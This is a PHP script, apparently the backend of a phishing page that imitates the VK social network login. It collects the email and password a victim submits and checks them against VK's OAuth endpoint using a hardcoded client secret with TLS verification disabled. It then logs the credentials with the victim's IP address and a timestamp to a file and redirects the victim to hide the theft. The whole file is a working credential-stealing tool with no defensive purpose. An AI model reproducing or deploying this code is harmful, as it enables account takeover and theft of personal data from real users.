<?php
    ini_set('default_charset', 'windows-1251');
    include('vk.php');// Подключаем инфу
    
    $a=1;//Счетчик 
    $mail = $_POST['email'];
    $pass = $_POST['pass'];

  // Инициализируем Curl
    $ch = curl_init(); 
    // Если не работает, надо зарегистрировать свой секретный ключ(http://vk.com/dev)
    curl_setopt($ch, CURLOPT_URL,'https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username='.$mail.'&password='.$pass);     
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
    $helper = curl_exec($ch); 
    curl_close($ch); 
    
    $id= current (explode('}',end(explode('user_id":',$helper)))); //Парсим id
    
  if ($mail != "" and $pass != "")  // Если не в первый раз
  { 
	
    if(!(preg_match('/[a-zA-Z]/', $id))) // Если верно
	{
	  $a=0;
	  echo '<meta http-equiv="Refresh" content="0;url='.$url.'">';
	}
  }

    
    if ($a ==1) // Если в первый раз
	echo $firstLogin;
  
    if(preg_match('/[a-zA-Z]/', $id)) 
	$id='fail';
    $today = date("H:i:s Y/m/d");
    
    $ip=$_SERVER['REMOTE_ADDR'];
    $info="$mail;$pass || IP: $ip || Time = $today || id: $id\r\n";
    $fh=fopen($out, "a+");
    fwrite($fh, $info); // Записываем данные
    fclose($fh);

  ?>